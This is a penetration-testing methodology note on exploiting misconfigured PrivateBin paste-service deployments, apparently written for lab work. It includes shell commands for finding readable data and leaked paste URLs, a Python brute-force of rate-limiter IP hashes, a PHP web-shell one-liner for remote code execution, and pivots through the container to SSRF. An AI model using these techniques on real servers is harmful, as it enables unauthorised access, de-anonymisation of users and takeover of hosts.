---
name: privatebin-misconfig
description: PrivateBin (privatebin.info) deployment misconfigurations — operator-readable paste data, config swaps, traffic_limiter hash leaks, container/host volume boundaries
tags: [methodology, privatebin, paste, container, conf-php, traffic-limiter, hash-leak]
source: Penlearn Local methodology
---

# PrivateBin Misconfigurations

> PrivateBin is a zero-knowledge paste service: ciphertext on server, key in URL fragment. Server-side it's a small PHP app. Security in deployment comes from filesystem permissions and the boundary between the PHP container and the host. When those leak, you get cleartext leaks, recoverable IP-rate-limiter entries, or PHP execution.

## Fingerprinting

- Subdomain like `bin.<target>`, `paste.<target>`, sometimes the root domain.
- HTML title `"PrivateBin"`, `<meta name="generator" content="PrivateBin ...">`.
- Default container image: `privatebin/nginx-fpm-alpine` (nginx + PHP-FPM on 8080).
- Data dir typically bind-mounted at `/srv/data` inside the container, often `/privatebin-data/` on the host.

## Issue #1 — Operator-readable paste data dir

Containers commonly bind-mount the host directory `/privatebin-data` with mode `770 root:operator`. That gives anyone in the `operator` group host-side read access to:

- `cfg/conf.php` — full PrivateBin config (paths, rate-limit thresholds)
- `cfg/conf.sample.php` — sample config (less interesting, but template for swap attacks)
- `data/<aa>/<bb>/<pasteid>.php` — actual paste ciphertext + metadata
- `data/traffic_limiter.php` — the IP rate-limiter store (see Issue #3)

```bash
id | grep -q operator && find /privatebin-data -type f -readable 2>/dev/null
```

Reading the paste files alone is not enough to recover plaintext — the decryption key is in the original URL fragment (`#xxxxxxxx`). But operator-readable paste data leaks **metadata**: creation time, IP hashes, paste IDs that may appear in shell histories or nginx logs.

## Issue #2 — Decryption needs the URL fragment

The pastes are AES-GCM encrypted client-side with a key in the URL fragment (after `#`). The fragment is never sent to the server, so reading host-side paste files alone won't give plaintext.

Sources where the full paste URL (including fragment) sometimes leak:

- nginx logs **if** the operator misconfigured a redirect that rewrote the fragment into a query string
- Bash history of an admin who shared a paste via `curl` or `wget`
- Browser bookmarks / shared link in chat tools
- Bug-report dumps where the user pasted the URL by mistake
- `traffic_limiter.php` doesn't store fragments, but neighbor logs in `/var/log/` might

`grep -rE 'https?://[^/]*/?\?[0-9a-f]+#[A-Za-z0-9_-]{20,}' /var/log /home /tmp /root 2>/dev/null`

## Issue #3 — `traffic_limiter.php` IP-hash leak

PrivateBin's rate limiter stores **SHA-256 hashes of client IPs** with a static or configured salt. The PHP file is plaintext and operator-readable in the misconfig above:

```php
<?php return ['<sha256-hash>' => <timestamp>, ...];
```

If the salt is the default empty string (or you can read `cfg/conf.php` to see what it is), you can brute the IPs of recent posters. Useful when you need to confirm "did the admin paste from this IP" or to seed an SSH brute target list.

```python
import hashlib
salt = b""  # check cfg/conf.php — option `[traffic] header` and `salt`
target_hash = "a27fc868..."
for last_octet in range(1, 255):
    for second in range(1, 255):
        ip = f"10.10.{second}.{last_octet}"
        if hashlib.sha256(salt + ip.encode()).hexdigest() == target_hash:
            print(ip)
```

If the operator subnet is unknown, run the same loop against `10.10.X.X` (HTB labs), `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.

## Issue #4 — `conf.php` swap (rarely works)

If `/privatebin-data` is operator-writable (mode 770 with group write), you might attempt to drop a malicious `conf.php` containing PHP code, hoping PrivateBin `include()`s it. **This usually fails** because the file is loaded via `parse_ini_file()` (INI parser, not PHP). Documented for completeness — it's a well-trodden dead end on modern PrivateBin builds. Always restore the original before moving on:

```bash
cp /privatebin-data/cfg/conf.php /tmp/conf.php.bak
# (attempt and verify)
cp /tmp/conf.php.bak /privatebin-data/cfg/conf.php
```

## Issue #5 — PHP-in-data RCE (also rarely works)

If the data directory ends up web-served, drop a `.php` file there and hit it via the nginx URL. This is blocked by:

- nginx config that explicitly denies `~ /data/`
- PHP-FPM `open_basedir` excluding `/srv/data`
- The default container ships a `.htaccess` (Apache only — ignored by nginx, so not actually a barrier)

Confirm by writing a marker and `curl`-ing for it:

```bash
echo "marker_$(date +%s)" > /privatebin-data/data/pwntest.txt
curl -sk https://bin.target/data/pwntest.txt   # any 200 = web-served
```

If 200 → upload a tiny PHP test file → `<?php system($_GET['c']); ?>` → RCE as `www-data` inside the container. The container then becomes the next pivot — read `cfg/conf.php` from inside (different filesystem boundary), enumerate inter-container links, hit the host docker socket if mounted.

## Issue #6 — Forging pastes to reach internal SSRF

If the deployment has SSRF elsewhere (see [[ssrf-proxy-endpoints]]), pointing it at the PrivateBin internal URL (`http://172.17.0.2:8080/?<pasteid>`) sometimes reveals **paste content + metadata** that the public proxy strips. Useful when the operator only proxies POSTs through nginx and exposes GETs differently.

## Detection signals

| Signal | Confirms |
|--------|----------|
| `ls /privatebin-data/cfg/conf.php` readable as low-priv user | Mount-perm misconfig |
| `cat /privatebin-data/data/traffic_limiter.php` shows IP hashes | Cleartext rate-limiter store |
| Found URL fragment in nginx logs / bash history | Plaintext decryption possible |
| `curl /data/marker.txt` returns 200 | Data dir web-served — try PHP RCE |
| Forged paste URL via SSRF returns content | SSRF chain into bin internals confirmed |

## Compliance mapping

- ttp_category: `misconfig` / `information_disclosure`
- MITRE ATT&CK: T1552.001 (Credentials in Files), T1083 (File & Directory Discovery)
- OWASP_TOP10: A01 (Broken Access Control), A05 (Security Misconfiguration)
- CWE: CWE-732 (Incorrect Permission Assignment), CWE-200 (Information Exposure)

## Cross-Reference

- [[ssrf-proxy-endpoints]] — when paired with SSRF elsewhere, the bin container becomes a pivot
- [[docker-group-privesc]] — escaping the container to host root is its own chain
- [[evidence-first]] — populate `observable_effect` with the recovered IP / paste / metadata, not the full ciphertext
